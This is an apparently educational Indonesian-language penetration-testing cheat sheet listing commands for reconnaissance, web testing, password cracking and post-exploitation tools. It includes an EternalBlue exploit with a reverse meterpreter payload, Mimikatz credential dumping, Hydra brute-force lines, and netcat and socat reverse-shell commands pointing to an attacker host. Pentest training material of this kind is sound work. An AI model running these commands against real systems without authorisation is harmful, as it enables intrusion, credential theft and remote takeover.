# 🛠️ Red Team Tools Cheat Sheet
## Panduan Cepat Tools Penetration Testing

---

## 🔄 Alur Kerja Red Team Tools



---

## � Alur Kerja Red Team Tools

```mermaid
graph TD
    START[🎯 Target Identification] --> RECON[🔍 Reconnaissance]

    RECON --> RECON1[📡 Passive Recon]
    RECON --> RECON2[🎯 Active Recon]

    RECON1 --> R1[theHarvester<br/>OSINT Gathering]
    RECON1 --> R2[Recon-ng<br/>Framework]
    RECON1 --> R3[Maltego<br/>Link Analysis]

    RECON2 --> R4[Nmap<br/>Port Scanning]
    RECON2 --> R5[Masscan<br/>Fast Scanning]
    RECON2 --> R6[Nikto<br/>Web Scanning]

    R4 --> VULN[🛡️ Vulnerability Assessment]
    R5 --> VULN
    R6 --> VULN

    VULN --> V1[Nessus<br/>Vuln Scanner]
    VULN --> V2[OpenVAS<br/>Open Source]
    VULN --> V3[Manual Testing<br/>Custom Scripts]

    V1 --> EXPLOIT[💥 Exploitation]
    V2 --> EXPLOIT
    V3 --> EXPLOIT

    EXPLOIT --> E1[Metasploit<br/>Framework]
    EXPLOIT --> E2[SQLMap<br/>SQL Injection]
    EXPLOIT --> E3[Burp Suite<br/>Web Apps]

    E1 --> POST[🏃 Post-Exploitation]
    E2 --> POST
    E3 --> POST

    POST --> P1[Mimikatz<br/>Credentials]
    POST --> P2[Empire<br/>PowerShell]
    POST --> P3[Cobalt Strike<br/>C2 Framework]

    style START fill:#e74c3c
    style RECON fill:#3498db
    style VULN fill:#f39c12
    style EXPLOIT fill:#e67e22
    style POST fill:#27ae60
```


---

## �🔍 Reconnaissance Tools

### Nmap - Network Scanner
```bash
# Basic scans
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -sS 192.168.1.100                     # SYN scan
nmap -sU 192.168.1.100                     # UDP scan
nmap -sV 192.168.1.100                     # Version detection
nmap -O 192.168.1.100                      # OS detection
nmap -A 192.168.1.100                      # Aggressive scan

# Advanced scans
nmap -p- 192.168.1.100                     # All ports
nmap -p 22,80,443 192.168.1.100            # Specific ports
nmap --top-ports 1000 192.168.1.100        # Top 1000 ports
nmap -sS -f -D RND:10 192.168.1.100        # Stealth with decoys

# Script scanning
nmap --script default 192.168.1.100        # Default scripts
nmap --script vuln 192.168.1.100           # Vulnerability scripts
nmap --script smb-vuln-* 192.168.1.100     # SMB vulnerabilities
nmap --script http-* 192.168.1.100         # HTTP scripts

# Output formats
nmap -oN scan.txt 192.168.1.100            # Normal output
nmap -oX scan.xml 192.168.1.100            # XML output
nmap -oG scan.gnmap 192.168.1.100          # Grepable output
nmap -oA scan 192.168.1.100                # All formats
```

### Masscan - Fast Port Scanner
```bash
# Basic usage
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Specific ports
masscan -p80,443,22 192.168.1.0/24 --rate=1000

# Output to file
masscan -p1-65535 192.168.1.0/24 --rate=1000 -oG masscan.txt
```

### theHarvester - Email/Domain Enumeration
```bash
# Basic usage
theHarvester -d target.com -b google

# Multiple sources
theHarvester -d target.com -b google,bing,yahoo

# Limit results
theHarvester -d target.com -b google -l 100

# Save to file
theHarvester -d target.com -b google -f results.html
```

### Recon-ng - OSINT Framework
```bash
# Start recon-ng
recon-ng

# Create workspace
workspaces create target_company

# Add domain
db insert domains target.com

# Install modules
marketplace install all

# Use module
modules load recon/domains-hosts/google_site_web
run

# Show results
show hosts
```

---

## 🌐 Web Application Testing

### Burp Suite Commands
```bash
# Start Burp Suite
burpsuite

# Proxy settings: 127.0.0.1:8080
# Install CA certificate from http://burp

# Intruder attack types:
# - Sniper: Single payload set
# - Battering ram: Same payload all positions
# - Pitchfork: Multiple sets parallel
# - Cluster bomb: All combinations
```

### SQLMap - SQL Injection Tool
```bash
# Basic testing
sqlmap -u "http://target.com/page.php?id=1"

# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Request file
sqlmap -r request.txt

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T table --columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T table --dump

# Advanced options
sqlmap -u "http://target.com/page.php?id=1" --batch --risk=3 --level=5
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Nikto - Web Server Scanner
```bash
# Basic scan
nikto -h http://target.com

# Specific port
nikto -h http://target.com:8080

# Use proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Output to file
nikto -h http://target.com -o nikto_results.txt
```

### Dirb/Dirbuster - Directory Enumeration
```bash
# Dirb basic
dirb http://target.com

# Custom wordlist
dirb http://target.com /usr/share/wordlists/dirb/big.txt

# Extensions
dirb http://target.com -X .php,.html,.txt

# Dirbuster (GUI)
dirbuster
```

### Gobuster - Directory/DNS Brute Forcer
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt

# Virtual host enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt
```

---

## 💥 Exploitation Tools

### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Update
msfupdate

# Search exploits
search type:exploit platform:windows
search cve:2017-0144
search ms17-010

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50

# Payloads
show payloads
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 4444

# Run exploit
exploit
run

# Meterpreter commands
sysinfo
getuid
ps
migrate <PID>
hashdump
screenshot
download file.txt
upload file.txt
shell
```

### Searchsploit - Exploit Database
```bash
# Search exploits
searchsploit apache 2.4

# Copy exploit
searchsploit -m 12345.py

# Update database
searchsploit -u
```

---

## 🔐 Password Attacks

### John the Ripper
```bash
# Basic cracking
john hashes.txt

# Wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Rules
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Brute force
john --incremental hashes.txt

# Show cracked
john --show hashes.txt

# Specific formats
john --format=NT hashes.txt
john --format=Raw-MD5 hashes.txt
```

### Hashcat - Advanced Password Recovery
```bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Combination attack
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule

# Hash modes
# 0 = MD5
# 100 = SHA1
# 1000 = NTLM
# 1400 = SHA256
# 1800 = SHA512
```

### Hydra - Network Login Cracker
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Multiple protocols
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
hydra -L users.txt -P passwords.txt 192.168.1.100 ftp
hydra -L users.txt -P passwords.txt 192.168.1.100 telnet
```

---

## 🏃 Post-Exploitation Tools

### Mimikatz - Credential Extraction
```bash
# In Metasploit
load mimikatz
wdigest

# Standalone
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
```

### PowerShell Empire
```bash
# Start Empire
./empire

# Listeners
listeners
uselistener http
set Host 192.168.1.50
execute

# Stagers
usestager windows/launcher_bat
set Listener http
execute

# Agents
agents
interact <agent_name>
```

### Cobalt Strike
```bash
# Team server
./teamserver 192.168.1.50 password

# Client
./cobaltstrike

# Beacon commands
sleep 60
shell whoami
powershell Get-Process
screenshot
keylogger
```

---

## 🔧 Utility Tools

### Netcat - Network Swiss Army Knife
```bash
# Listen for connections
nc -lvp 4444

# Connect to host
nc 192.168.1.100 4444

# File transfer
# Receiver: nc -lvp 4444 > file.txt
# Sender: nc 192.168.1.100 4444 < file.txt

# Reverse shell
nc -lvp 4444
# On target: nc 192.168.1.50 4444 -e /bin/bash
```

### Socat - Advanced Netcat
```bash
# TCP relay
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Encrypted shell
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork EXEC:/bin/bash

# File transfer
socat TCP-LISTEN:4444,fork file:file.txt,create
socat TCP:192.168.1.100:4444 file:received.txt,create
```

### Proxychains - Proxy Tool
```bash
# Configure /etc/proxychains.conf
# Add: socks4 127.0.0.1 9050

# Use with tools
proxychains nmap 192.168.1.100
proxychains firefox
```

---

## 📊 Reporting Tools

### Dradis - Collaboration Platform
```bash
# Install
gem install dradis-ce

# Start
dradis-ce

# Access: http://localhost:3000
```

### Faraday - Vulnerability Management
```bash
# Install
pip install faradaysec

# Start
faraday-server

# Access: http://localhost:5985
```

---

## 🎯 Quick Reference Commands

### One-liners for Common Tasks
```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Check sudo permissions
sudo -l

# Network connections
netstat -tulpn
ss -tulpn

# Running processes
ps aux
ps -ef

# Cron jobs
crontab -l
cat /etc/crontab

# Environment variables
env
printenv

# System information
uname -a
cat /etc/os-release
cat /proc/version
```

### Windows Commands
```cmd
# System info
systeminfo
whoami /all

# Network info
ipconfig /all
netstat -an

# Users and groups
net user
net localgroup administrators

# Services
sc query
wmic service list

# Processes
tasklist
wmic process list

# Scheduled tasks
schtasks /query

# Registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

---

*Cheat Sheet ini mencakup perintah-perintah paling umum untuk penetration testing. Selalu gunakan dengan izin dan dalam lingkungan yang legal.*
